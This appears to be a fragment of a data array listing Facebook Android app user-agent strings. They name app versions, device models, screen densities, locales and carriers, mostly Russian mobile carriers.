"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/338697191;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672645;FBDM/{density=3.0,width=1080,height=2137};FBLC/ru_RU;FBRV/314972287;FBCR/MegaFon #1;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/JSN-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=2.8125,width=1080,height=2175};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A415F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279743;FBDM/{density=2.0,width=720,height=1344};FBLC/ru_RU;FBRV/337989149;FBCR/MTS RUS;FBMF/OUKITEL;FBBD/OUKITEL;FBPN/com.facebook.katana;FBDV/WP5;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518981;FBDM/{density=3.0,width=1080,height=2032};FBLC/ru_RU;FBRV/289140577;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/LLD-L31;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/331.1.0.29.117;FBBV/310595753;FBDM/{density=3.0,width=1080,height=2128};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/SNE-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/341.0.0.30.73;FBBV/326471161;FBDM/{density=1.875,width=720,height=1465};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621604;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBRV/302532514;FBCR/elisa | Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J530F;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906205;FBDM/{density=2.0,width=720,height=1358};FBLC/ru_RU;FBRV/296240860;FBCR/Tele2;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/AUM-L41;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.0,width=720,height=1280};FBLC/ru_RU;FBRV/335247818;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=3.0,width=1080,height=2076};FBLC/ru_RU;FBRV/335500980;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660426;FBDM/{density=3.0,width=1080,height=2168};FBLC/lt_LT;FBRV/306637004;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A525F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950303;FBDM/{density=3.0,width=1080,height=2113};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672640;FBDM/{density=1.75,width=720,height=1423};FBLC/ru_RU;FBRV/314609338;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A205FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957718;FBDM/{density=1.75,width=720,height=1411};FBLC/ru_RU;FBRV/334626402;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M115F;FBSV/11;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2076};FBLC/ru_RU;FBRV/335666772;FBCR/Tele2You;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A750FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906272;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/294885832;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FM;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606764;FBDM/{density=3.375,width=1080,height=2139};FBLC/ru_RU;FBRV/314125016;FBCR/Beeline;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/342.0.0.37.119;FBBV/328226376;FBDM/{density=2.0,width=720,height=1365};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M015F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.8125,width=1080,height=2186};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A325F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/313.0.0.35.119;FBBV/282998037;FBDM/{density=3.0,width=1080,height=2060};FBLC/ru_RU;FBRV/285101639;FBCR/Tele2;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=2.0,width=720,height=1369};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2110};FBLC/ru_RU;FBRV/335581396;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=3.0,width=1080,height=2107};FBLC/ru_RU;FBRV/337672225;FBCR/Beeline;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906272;FBDM/{density=3.0,width=1080,height=2132};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX1921;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/340.0.0.27.113;FBBV/324485356;FBDM/{density=2.75,width=1080,height=2135};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672707;FBDM/{density=2.75,width=1080,height=2168};FBLC/ru_RU;FBRV/299927973;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076526;FBDM/{density=3.0,width=1080,height=2020};FBLC/ru_RU;FBRV/304410961;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/320.0.0.34.118;FBBV/293906241;FBDM/{density=3.375,width=1080,height=2090};FBLC/ru_RU;FBRV/295281923;FBCR/Beeline;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/PCT-L29;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/323.0.0.46.119;FBBV/298672900;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/0;FBCR/YOTA;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo Z90a40;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672647;FBDM/{density=3.1875,width=1080,height=2104};FBLC/ru_RU;FBRV/314507560;FBCR/YOTA;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M315F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444755;FBDM/{density=3.0,width=1080,height=2130};FBLC/ru_RU;FBRV/280037930;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1915;FBSV/11;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2110};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950318;FBDM/{density=2.0,width=720,height=1365};FBLC/ru_RU;FBRV/337672225;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M015F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/325.0.0.36.170;FBBV/301621682;FBDM/{density=3.0,width=1080,height=2107};FBLC/ru_RU;FBRV/302619604;FBCR/Tele2;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1M;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/334.0.0.32.119;FBBV/314823326;FBDM/{density=3.0,width=1080,height=2165};FBLC/ru_RU;FBRV/316150267;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.8125,width=1080,height=2174};FBLC/pt_PT;FBRV/342401578;FBCR/MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/347.0.0.28.237;FBBV/337279749;FBDM/{density=3.0,width=1080,height=2113};FBLC/ru_RU;FBRV/338892933;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-M215F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/343.0.0.37.117;FBBV/329937466;FBDM/{density=3.0,width=1080,height=2168};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/324.0.0.48.120;FBBV/300480879;FBDM/{density=1.1625,width=1280,height=744};FBLC/en_GB;FBRV/302048709;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X104F;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987624;FBDM/{density=2.625,width=1080,height=1920};FBLC/ru_RU;FBRV/277740997;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J730FM;FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672599;FBDM/{density=2.75,width=1080,height=2030};FBLC/ru_RU;FBRV/0;FBCR/Beeline;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 5;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/321.0.0.37.119;FBBV/295907005;FBDM/{density=4.0,width=1440,height=2900};FBLC/ru_RU;FBRV/297509511;FBCR/MegaFon #1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/326.0.0.34.120;FBBV/303076492;FBDM/{density=1.5,width=540,height=960};FBLC/ru_RU;FBRV/304410961;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J250F;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/314.1.0.45.119;FBBV/285360755;FBDM/{density=3.0,width=1080,height=2139};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.0,width=720,height=1356};FBLC/ru_RU;FBRV/334947106;FBCR/MegaFon #1;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/DUA-L22;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=2.0,width=720,height=1426};FBLC/ru_RU;FBRV/334074629;FBCR/Tele2;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660344;FBDM/{density=3.0,width=1080,height=2040};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/BKL-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606775;FBDM/{density=2.625,width=1080,height=2183};FBLC/ru_RU;FBRV/313158868;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A715F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950334;FBDM/{density=2.0,width=720,height=1369};FBLC/ru_RU;FBRV/337153624;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957701;FBDM/{density=3.0,width=1080,height=2038};FBLC/ru_RU;FBRV/333897099;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/BND-L21;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/344.0.0.34.116;FBBV/331704277;FBDM/{density=2.75,width=1080,height=2179};FBLC/ru_RU;FBRV/0;FBCR/Tele2You;FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/312.0.0.45.117;FBBV/281505391;FBDM/{density=3.375,width=1080,height=2139};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1T;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606716;FBDM/{density=2.75,width=1080,height=2116};FBLC/ru_RU;FBRV/313881481;FBCR/Tele2;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/POCOPHONE F1;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/322.0.0.35.121;FBBV/297186297;FBDM/{density=3.0,width=1080,height=2060};FBLC/ru_RU;FBRV/298037852;FBCR/MegaFon Fastest;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/COL-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=2.75,width=1080,height=2130};FBLC/ru_RU;FBRV/334917327;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M1908C3JGG;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=3.0,width=1080,height=2076};FBLC/ru_RU;FBRV/306052152;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/327.0.0.33.120;FBBV/304400874;FBDM/{density=3.0,width=1080,height=2265};FBLC/ru_RU;FBRV/305464431;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950303;FBDM/{density=3.0,width=1080,height=2032};FBLC/ru_RU;FBRV/0;FBCR/YOTA;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/LLD-L21;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660426;FBDM/{density=3.0,width=1080,height=2113};FBLC/ru_RU;FBRV/306637004;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A305FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279835;FBDM/{density=2.75,width=1080,height=2134};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2004J19C;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/329.0.0.29.120;FBBV/307279835;FBDM/{density=2.75,width=1080,height=2131};FBLC/ru_RU;FBRV/308990972;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/328.0.0.22.119;FBBV/305660392;FBDM/{density=2.0,width=720,height=1184};FBLC/ru_RU;FBRV/306537052;FBCR/TELE2;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3311;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.625,width=1080,height=2195};FBLC/ru_RU;FBRV/336698666;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A315F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.0,width=720,height=1358};FBLC/ru_RU;FBRV/335613337;FBCR/MTS RUS;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/AUM-L29;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/330.0.0.31.120;FBBV/308809026;FBDM/{density=3.0,width=1080,height=2139};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/HRY-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287519009;FBDM/{density=1.875,width=720,height=1465};FBLC/ru_RU;FBRV/289140577;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/337.0.0.32.118;FBBV/319571049;FBDM/{density=2.75,width=1080,height=2130};FBLC/ru_RU;FBRV/321846695;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957731;FBDM/{density=2.0,width=720,height=1440};FBLC/ru_RU;FBRV/334947106;FBCR/MTS RUS;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2127;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606775;FBDM/{density=2.625,width=1080,height=2131};FBLC/ru_RU;FBRV/312856793;FBCR/Beeline;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950303;FBDM/{density=2.625,width=1080,height=2094};FBLC/ru_RU;FBRV/336583093;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/335.0.0.28.118;FBBV/316528023;FBDM/{density=1.3312501,width=800,height=1216};FBLC/ru_RU;FBRV/318280044;FBCR/ROSTELECOM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T295;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.0,width=1080,height=2153};FBLC/ru_RU;FBRV/335883489;FBCR/MegaFon #1;FBMF/realme;FBBD/realme;FBPN/com.facebook.katana;FBDV/RMX2156;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919015;FBDM/{density=1.875,width=720,height=1458};FBLC/en_US;FBRV/342837856;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A426U;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606775;FBDM/{density=2.625,width=1080,height=2058};FBLC/en_US;FBRV/0;FBCR/ ;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g power (XT2041DL);FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=2.625,width=1080,height=2232};FBLC/en_US;FBRV/342673703;FBCR/cricket;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-Q730;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/348.0.0.39.118;FBBV/338919016;FBDM/{density=3.0,width=1080,height=2076};FBLC/en_US;FBRV/343998514;FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G965U;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950291;FBDM/{density=3.375,width=1080,height=1920};FBLC/ru_RU;FBRV/337551466;FBCR/MegaFon #1;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A520F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/319.0.0.39.120;FBBV/292233375;FBDM/{density=3.1875,width=1080,height=2168};FBLC/ru_RU;FBRV/294168503;FBCR/ROSTELECOM;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A315F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957732;FBDM/{density=3.375,width=1080,height=2095};FBLC/ru_RU;FBRV/334932975;FBCR/Tele2;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335949544;FBDM/{density=2.8125,width=1080,height=2177};FBLC/ru_RU;FBRV/337612416;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A515F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957687;FBDM/{density=2.0,width=2560,height=1600};FBLC/ru_RU;FBRV/0;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T805;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/346.0.0.29.119;FBBV/335950338;FBDM/{density=2.625,width=1080,height=2184};FBLC/ru_RU;FBRV/337320845;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A415F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957647;FBDM/{density=2.0,width=720,height=1406};FBLC/ru_RU;FBRV/334763932;FBCR/MTS RUS;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1906;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265245034;FBDM/{density=2.25,width=720,height=1447};FBLC/ru_RU;FBRV/268119191;FBCR/MTS RUS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A125F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/316.0.0.54.116;FBBV/287518977;FBDM/{density=1.275,width=540,height=1071};FBLC/ru_RU;FBRV/0;FBCR/Tele2;FBMF/DOOGEE;FBBD/DOOGEE;FBPN/com.facebook.katana;FBDV/X70;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/333.0.0.30.119;FBBV/313672610;FBDM/{density=3.0,width=1080,height=1920};FBLC/ru_RU;FBRV/314366011;FBCR/Tele2;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/318.0.0.39.154;FBBV/290428847;FBDM/{density=2.75,width=1080,height=2132};FBLC/ru_RU;FBRV/292693120;FBCR/MTS RUS;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/M2010J19SG;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",
"[FBAN/FB4A;FBAV/332.0.0.23.111;FBBV/311606442;FBDM/{density=2.625,width=1080,height=2195};FBLC/ru_RU;FBRV/0;FBCR/MegaFon;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A315F;FBSV/11;FBOP/19;FBCA/arm64-v8a:;]",
